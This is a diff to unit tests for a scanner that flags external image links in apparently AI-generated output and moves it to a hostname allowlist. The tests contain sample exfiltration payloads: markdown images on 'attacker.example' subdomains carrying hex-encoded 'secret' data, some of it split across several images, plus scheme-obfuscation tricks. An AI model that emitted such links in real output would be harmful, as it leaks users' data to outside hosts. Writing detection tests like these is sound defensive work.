@@ -28,7 +28,6 @@ class ExternalResourceConfigTests(unittest.TestCase):
             "max_candidates",
             "max_markup_chars",
             "max_url_chars",
-            "opaque_path_segment_chars",
         ):
             with self.subTest(field=field_name), self.assertRaises(TypeError):
                 ExternalResourceConfig(**{field_name: True})  # type: ignore[arg-type]
@@ -40,8 +39,8 @@ class ExternalResourceConfigTests(unittest.TestCase):
             ExternalResourceConfig(max_markup_chars=65_537)
         with self.assertRaises(ValueError):
             ExternalResourceConfig(max_url_chars=65_537)
-        with self.assertRaises(ValueError):
-            ExternalResourceConfig(opaque_path_segment_chars=15)
+        with self.assertRaisesRegex(TypeError, "opaque_path_segment_chars"):
+            ExternalResourceConfig(opaque_path_segment_chars=64)  # type: ignore[call-arg]
 
     def test_hostname_allowlist_is_normalized_bounded_and_hidden(self) -> None:
         config = ExternalResourceConfig(
@@ -67,8 +66,8 @@ class ExternalResourceConfigTests(unittest.TestCase):
 
 
 class ExternalResourceRuleTests(unittest.TestCase):
-    def test_markdown_query_redacts_only_destination_with_safe_metadata(self) -> None:
-        url = "https://outside.example/pixel.png?payload=synthetic"
+    def test_markdown_external_host_redacts_only_url_with_safe_metadata(self) -> None:
+        url = "https://outside.example/pixel.png"
         text = f"before ![status]({url} \"preview\") after"
 
         finding = _scanner().scan(text, scope=ScanScope.OUTPUT)[0]
@@ -84,7 +83,7 @@ class ExternalResourceRuleTests(unittest.TestCase):
         self.assertEqual(
             dict(finding.metadata),
             {
-                "reason": "query_string",
+                "reason": "hostname_not_allowed",
                 "resource_syntax": "markdown_image",
                 "scheme": "https",
                 "detector": "bounded_external_resource",
@@ -114,7 +113,9 @@ class ExternalResourceRuleTests(unittest.TestCase):
                 self.assertEqual(
                     finding.metadata["resource_syntax"], "html_img_src"
                 )
-                self.assertEqual(finding.metadata["reason"], "query_string")
+                self.assertEqual(
+                    finding.metadata["reason"], "hostname_not_allowed"
+                )
 
     def test_angle_nested_escaped_and_scheme_relative_markdown(self) -> None:
         values = (
@@ -145,13 +146,26 @@ class ExternalResourceRuleTests(unittest.TestCase):
             1,
         )
 
-    def test_opaque_path_segment_is_an_objective_risk_signal(self) -> None:
-        token = "Ab01" * 16
-        text = f"![status](https://outside.example/{token})"
+    def test_hostname_encoded_data_is_redacted_with_a_short_path(self) -> None:
+        text = "![status](https://736563726574.attacker.example/a.png)"
 
         finding = _scanner().scan(text, scope=ScanScope.OUTPUT)[0]
 
-        self.assertEqual(finding.metadata["reason"], "opaque_path_segment")
+        self.assertEqual(finding.metadata["reason"], "hostname_not_allowed")
+
+    def test_multiple_images_cannot_chunk_data_across_hostnames(self) -> None:
+        text = (
+            "![one](https://736563.attacker.example/a.png)"
+            "![two](https://726574.attacker.example/b.png)"
+        )
+
+        findings = _scanner().scan(text, scope=ScanScope.OUTPUT)
+
+        self.assertEqual(len(findings), 2)
+        self.assertEqual(
+            {finding.metadata["reason"] for finding in findings},
+            {"hostname_not_allowed"},
+        )
 
     def test_exact_and_suffix_allowlists_suppress_only_matching_hosts(self) -> None:
         scanner = _scanner(
@@ -161,9 +175,9 @@ class ExternalResourceRuleTests(unittest.TestCase):
             )
         )
         values = (
-            "![x](https://cdn.example/p?d=one)",
-            "![x](https://a.assets.example/p?d=two)",
-            "![x](https://notassets.example/p?d=three)",
+            "![x](https://cdn.example/p.png?cache=one)",
+            "![x](https://a.assets.example/" + "Ab01" * 16 + ")",
+            "![x](https://notassets.example/p.png)",
         )
 
         self.assertEqual(scanner.scan(values[0], scope=ScanScope.OUTPUT), ())
@@ -180,6 +194,19 @@ class ExternalResourceRuleTests(unittest.TestCase):
 
         self.assertEqual(finding.metadata["reason"], "ambiguous_authority")
 
+    def test_malformed_external_authorities_fail_closed_without_a_query(self) -> None:
+        values = (
+            "![missing](https:///a.png)",
+            '<img src="https://[invalid/a.png">',
+        )
+
+        for text in values:
+            with self.subTest(text=text):
+                finding = _scanner().scan(text, scope=ScanScope.OUTPUT)[0]
+                self.assertEqual(
+                    finding.metadata["reason"], "ambiguous_authority"
+                )
+
     def test_browser_normalized_scheme_forms_cannot_bypass_detection(self) -> None:
         values = (
             '<img src="h&#x09;ttps://outside.example/p?d=one">',
@@ -191,7 +218,7 @@ class ExternalResourceRuleTests(unittest.TestCase):
                 finding = _scanner().scan(text, scope=ScanScope.OUTPUT)[0]
                 self.assertIn(
                     finding.metadata["reason"],
-                    ("query_string", "ambiguous_authority"),
+                    ("hostname_not_allowed", "ambiguous_authority"),
                 )
 
     def test_html_literal_space_is_excluded_from_url_span(self) -> None:
@@ -210,7 +237,6 @@ class ExternalResourceRuleTests(unittest.TestCase):
             "plain output",
             "[click](https://outside.example/p?d=one)",
             "![local](/images/p.png?d=one)",
-            "![safe](https://outside.example/p.png)",
             "![data](data:image/png;base64,AAAA)",
             r"\![escaped](https://outside.example/p?d=one)",
             "![unterminated](https://outside.example/p?d=one",
@@ -311,8 +337,8 @@ class ExternalResourceRuleTests(unittest.TestCase):
         suffixes = (
             "",
             "![label] ordinary text\n" * 100_000,
-            "![x](https://outside.example/p.png?d=one)",
-            '<img src="https://outside.example/' + "a" * 64 + '">',
+            "![x](https://736563726574.attacker.example/a.png)",
+            '<img src="https://outside.example/a.png">',
         )
         for suffix in suffixes:
             suffix = suffix[:8_000_000]
@@ -321,7 +347,7 @@ class ExternalResourceRuleTests(unittest.TestCase):
             findings = scanner.scan(text, scope=ScanScope.OUTPUT)
             elapsed = time.perf_counter() - started
 
-            expected = int("outside.example" in suffix)
+            expected = int("https://" in suffix)
             self.assertEqual(len(findings), expected)
             self.assertLess(elapsed, 2.0)
 
@@ -332,7 +358,6 @@ class ExternalResourceFacadeTests(unittest.TestCase):
             max_candidates=7,
             max_markup_chars=1_024,
             max_url_chars=512,
-            opaque_path_segment_chars=48,
             allowed_hostnames=("cdn.example",),
             allowed_hostname_suffixes=("assets.example",),
         )
@@ -352,7 +377,6 @@ class ExternalResourceFacadeTests(unittest.TestCase):
         self.assertEqual(capability.max_candidates, 7)
         self.assertEqual(capability.max_markup_chars, 1_024)
         self.assertEqual(capability.max_url_chars, 512)
-        self.assertEqual(capability.opaque_path_segment_chars, 48)
         self.assertEqual(capability.allowed_hostname_count, 1)
         self.assertEqual(capability.allowed_hostname_suffix_count, 1)
         self.assertNotIn("cdn.example", repr(capability))
